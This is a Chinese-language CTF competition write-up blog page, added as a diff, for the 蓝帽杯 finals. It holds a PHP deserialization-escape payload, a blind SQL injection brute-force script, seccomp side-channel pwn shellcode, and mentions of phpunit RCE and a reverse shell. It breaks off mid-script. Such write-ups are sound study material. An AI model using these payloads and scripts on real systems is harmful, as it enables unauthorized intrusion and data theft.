@@ -1,0 +1,1257 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="sharun">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="sharun">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="Lun4R|Nepnep|务农|小菜鸡一枚|ddddhm|又乖又怂.jpg">
+    <meta name="description" content="WEBPHP获取备份后发现有对序列化字符串的操作，经典的反序列化逃逸特征，   然后发现过滤的dir并不是数组中的dir，而是我们一开始传进去的get参数，构造payload如下 ?user&#x3D;ohhhh&amp;pass&#x3D;a3333&amp;repass&#x3D;adminadminadminadminadminadminadminadminadminadminadminadminadminadminad">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sharun&#39;s blogs">
+<meta property="og:url" content="http://sharun.xyz/2021/01/01/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-%E7%88%86%E7%82%92%E8%85%B0%E8%8A%B1WP/index.html">
+<meta property="og:site_name" content="sharun&#39;s blogs">
+<meta property="og:description" content="WEBPHP获取备份后发现有对序列化字符串的操作，经典的反序列化逃逸特征，   然后发现过滤的dir并不是数组中的dir，而是我们一开始传进去的get参数，构造payload如下 ?user&#x3D;ohhhh&amp;pass&#x3D;a3333&amp;repass&#x3D;adminadminadminadminadminadminadminadminadminadminadminadminadminadminad">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://uploader.shimo.im/f/duta6sJ2QZsgKhoc.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="og:image" content="https://uploader.shimo.im/f/ZlAsQqFLaUTNPj8f.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="og:image" content="https://uploader.shimo.im/f/UHRlnBcNY2vJ14rw.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="og:image" content="https://uploader.shimo.im/f/eo7r1gO1TXCFe0wQ.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="og:image" content="https://uploader.shimo.im/f/HOqWLEql7OubweXc.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="og:image" content="https://uploader.shimo.im/f/hkIUEVUhIZqfdC2J.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="og:image" content="https://uploader.shimo.im/f/2SiGWdWJFCTI96Mu.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="og:image" content="https://uploader.shimo.im/f/7IHf4GXAOcu0OqMT.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="og:image" content="https://uploader.shimo.im/f/KnDYWnfMZHu2zy3i.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="og:image" content="https://uploader.shimo.im/f/a0HB2S2YipjFqu5X.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="og:image" content="https://uploader.shimo.im/f/VSOPM5cga2hhsSvQ.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="og:image" content="https://uploader.shimo.im/f/257jpnnKT6KuRkyr.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="og:image" content="https://uploader.shimo.im/f/LoZCigS5VbJxhYTo.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="og:image" content="https://uploader.shimo.im/f/uRxLkDcplO5aDJ3f.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="og:image" content="https://uploader.shimo.im/f/dz5I2at61EGCT5kK.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="og:image" content="https://uploader.shimo.im/f/UKIa2isXiV4pTpyX.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="og:image" content="https://uploader.shimo.im/f/8JFCib49NLzjrsj3.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="og:image" content="https://uploader.shimo.im/f/eds6YkgkgyutXsUr.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+<meta property="article:published_time" content="2021-01-01T02:17:40.445Z">
+<meta property="article:modified_time" content="2021-01-01T02:17:51.786Z">
+<meta property="article:author" content="sharun">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://uploader.shimo.im/f/duta6sJ2QZsgKhoc.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>Sharun&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="sharun's blogs" type="application/atom+xml">
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Sharun&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name"></a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Sharun's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            [Untitled Post]
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">1.5k</span>Reading time: <span class="post-count reading-time">7 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2021/01/01</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>获取备份后发现有对序列化字符串的操作，经典的反序列化逃逸特征，</p>
+<p><img src="https://uploader.shimo.im/f/duta6sJ2QZsgKhoc.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p><img src="https://uploader.shimo.im/f/ZlAsQqFLaUTNPj8f.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>然后发现过滤的dir并不是数组中的dir，而是我们一开始传进去的get参数，构造payload如下</p>
+<p>?user=ohhhh&amp;pass=a3333&amp;repass=adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin%22;s:3:%22dir%22;s:5:%22/flag%22;}&amp;dir=pcyq23333</p>
+<p>flag：</p>
+<p><img src="https://uploader.shimo.im/f/UHRlnBcNY2vJ14rw.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<h2 id="login："><a href="#login：" class="headerlink" title="login："></a>login：</h2><p>根据题目给的提示可以知道是phpunit框架，然后根据已知的漏洞可以在/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php中执行post进去的内容，但是本题ban掉了很多函数，然后php反弹shell也没有维持成功，利用python的反弹shell方式可以成功</p>
+<p><img src="https://uploader.shimo.im/f/eo7r1gO1TXCFe0wQ.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>尝试直接用python的命令执行读取flag，发现权限不够，所以要想办法提权。</p>
+<p>然后因为本题目使用的是默认的DVWA框架，所以可以通过读取/config/config.inc.php文件来获取用户名和密码</p>
+<p><img src="https://uploader.shimo.im/f/HOqWLEql7OubweXc.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>最后利用python实现命令行交互，获得admin权限后就可以获取flag</p>
+<p>flag：</p>
+<p><img src="https://uploader.shimo.im/f/hkIUEVUhIZqfdC2J.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<h2 id="login2"><a href="#login2" class="headerlink" title="login2"></a>login2</h2><p>BJDCTF2020的原题，改下脚本就行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests as req</span><br><span class="line">def ord2hex(string):</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line">for i in string:</span><br><span class="line">result +&#x3D; hex(ord(i))</span><br><span class="line">result &#x3D; result.replace(&#39;0x&#39;,&#39;&#39;)</span><br><span class="line">return &#39;0x&#39;+result</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;eci-2zeh6dgtru4egt90l2sv.cloudeci1.ichunqiu.com:80&#x2F;index.php&quot;</span><br><span class="line">string &#x3D; [ord(i) for i in &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;]</span><br><span class="line">headers &#x3D; &#123;</span><br><span class="line">&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 6.2; rv:16.0) Gecko&#x2F;20100101 Firefox&#x2F;16.0&#39;,</span><br><span class="line">&#39;Accept&#39;:&#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">&#39;Connection&#39;:&#39;keep-alive&#39;</span><br><span class="line">&#125;</span><br><span class="line">res &#x3D; &#39;&#39;</span><br><span class="line">for i in range(50):</span><br><span class="line">for j in string:</span><br><span class="line">passwd &#x3D; ord2hex(&#39;^&#39;+res+chr(j))</span><br><span class="line"># print(passwd)</span><br><span class="line">passwd &#x3D; &#39;or&#x2F;**&#x2F;password&#x2F;**&#x2F;regexp&#x2F;**&#x2F;binary&#x2F;**&#x2F;&#123;&#125;#&#39;.format(passwd)</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">&#39;username&#39;:&quot;admin\\&quot;,</span><br><span class="line">&#39;password&#39;:passwd</span><br><span class="line">&#125;</span><br><span class="line">r &#x3D; req.post(url, data&#x3D;data, headers&#x3D;headers)</span><br><span class="line"># print(r.text)</span><br><span class="line">if &quot;账号或密码错误！&quot; not in r.text:</span><br><span class="line">res +&#x3D; chr(j)</span><br><span class="line">print(res)</span><br><span class="line">break</span><br></pre></td></tr></table></figure>
+<p>flag：</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://uploader.shimo.im/f/2SiGWdWJFCTI96Mu.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></h1><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>转assii</p>
+<h2 id="MISC隐写"><a href="#MISC隐写" class="headerlink" title="MISC隐写"></a>MISC隐写</h2><p>用binwalk提取图片内容，提取出一个PDF和加密压缩</p>
+<p>PDF用wb4stego解密</p>
+<p>得到</p>
+<p><img src="https://uploader.shimo.im/f/7IHf4GXAOcu0OqMT.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>没解出来，但是爆破压缩包密码，得到了rmrf，keyword cipher解密</p>
+<p><img src="https://uploader.shimo.im/f/KnDYWnfMZHu2zy3i.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p><img src="https://uploader.shimo.im/f/a0HB2S2YipjFqu5X.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<h2 id="QAQ-pcap"><a href="#QAQ-pcap" class="headerlink" title="QAQ_pcap"></a>QAQ_pcap</h2><p>在65流里找到了TLS的log，可以对TLS流量进行解密</p>
+<p><img src="https://uploader.shimo.im/f/VSOPM5cga2hhsSvQ.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>解密后可以提取出一个rar文件</p>
+<p>解压得到so_easy.pcap,文件头被改了，改回来</p>
+<p><img src="https://uploader.shimo.im/f/257jpnnKT6KuRkyr.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>对流量包进行分析，发现是多个usb设备的流量，将每个单独过滤保存。</p>
+<p><img src="https://uploader.shimo.im/f/LoZCigS5VbJxhYTo.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>单独分析，有一个鼠标流量，一个键盘流量，鼠标画出来啥都不是</p>
+<p>流量键盘用脚本进行解析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mappings &#x3D; &#123; 0x04:&quot;A&quot;,  0x05:&quot;B&quot;,  0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;, 0x09:&quot;F&quot;, 0x0A:&quot;G&quot;,  0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;,  0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;, 0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;,  0x13:&quot;P&quot;, 0x14:&quot;Q&quot;, 0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;, 0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;, 0x21:&quot;4&quot;, 0x22:&quot;5&quot;,  0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;, 0x27:&quot;0&quot;, 0x28:&quot;\n&quot;, 0x2a:&quot;[DEL]&quot;,  0X2B:&quot;    &quot;, 0x2C:&quot; &quot;,  0x2D:&quot;-&quot;, 0x2E:&quot;&#x3D;&quot;, 0x2F:&quot;[&quot;,  0x30:&quot;]&quot;,  0x31:&quot;\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;,  0x34:&quot;&#39;&quot;, 0x36:&quot;,&quot;,  0x37:&quot;.&quot; ,225:&quot;[LeftShift]&quot;,229:&quot;[RightShift]&quot;,0x50:&quot;[LeftArrow1]&quot;&#125;</span><br><span class="line">nums &#x3D; []</span><br><span class="line">keys &#x3D; open(&#39;key.txt&#39;)</span><br><span class="line">for line in keys:</span><br><span class="line">	if(len(line)) !&#x3D; 17:</span><br><span class="line">		continue</span><br><span class="line">	print(line[4:6])</span><br><span class="line">	nums.append(int(line[4:6],16))</span><br><span class="line">keys.close()</span><br><span class="line">print(nums)</span><br><span class="line">output &#x3D; &quot;&quot;</span><br><span class="line">for n in nums:</span><br><span class="line">	if n &#x3D;&#x3D; 0 :</span><br><span class="line">		continue</span><br><span class="line">	if n in mappings:</span><br><span class="line">		output +&#x3D; mappings[n]</span><br><span class="line">	else:</span><br><span class="line">		output +&#x3D; &quot;[&quot;+str(n)+&quot;]&quot;</span><br><span class="line">print(&#39;output :\n&#39; + output)</span><br></pre></td></tr></table></figure>
+<p>注意有LeftArrow1和shfit,都解释出来后就得到flag了<br>flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hi!This is y flag!</span><br><span class="line">The flag[] is flag&#123;Pc@p_1s_5o_3asY!&#125;</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h2><p><img src="https://uploader.shimo.im/f/uRxLkDcplO5aDJ3f.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>Seccomp沙箱，有open read函数没有write写函数</p>
+<p>基本思路是构造爆破（之前打过一个比赛跟这个思路差不多都是构造shellcode比较爆破）</p>
+<p>open后read，使用cmp比较，等于则使用jz进行死循环，否则ret退出</p>
+<p><img src="https://uploader.shimo.im/f/dz5I2at61EGCT5kK.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>完整exp如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;chall&#39;)</span><br><span class="line">EXCV &#x3D; context.binary &#x3D; &#39;.&#x2F;chall&#39;</span><br><span class="line">#libc&#x3D;(&#39;&#39;)</span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"> </span><br><span class="line">def pwn(p, idx, c):</span><br><span class="line">    # open</span><br><span class="line">    shellcode &#x3D; &quot;push 0x10032aaa; pop rdi; shr edi, 12; xor esi, esi; push 2; pop rax; syscall;&quot;</span><br><span class="line"> </span><br><span class="line">    # re open, rax &#x3D;&gt; 4</span><br><span class="line">    shellcode +&#x3D; &quot;push 2; pop rax; syscall;&quot;</span><br><span class="line"> </span><br><span class="line">    # read(rax, 0x10040, 0x50)</span><br><span class="line">    shellcode +&#x3D; &quot;mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;&quot;</span><br><span class="line">    </span><br><span class="line">    # cmp and jz</span><br><span class="line">    if idx &#x3D;&#x3D; 0:</span><br><span class="line">        shellcode +&#x3D; &quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;.format(idx, c)</span><br><span class="line">    else:</span><br><span class="line">        shellcode +&#x3D; &quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;.format(idx, c)</span><br><span class="line"> </span><br><span class="line">    shellcode &#x3D; asm(shellcode)</span><br><span class="line"> </span><br><span class="line">    p.sendafter(&quot;xecution-box.\n&quot;, shellcode.ljust(0x40-14, b&#39;a&#39;) + b&#39;&#x2F;home&#x2F;pwn&#x2F;flag&#39;)</span><br><span class="line"> </span><br><span class="line">idx &#x3D; 0</span><br><span class="line">var_list 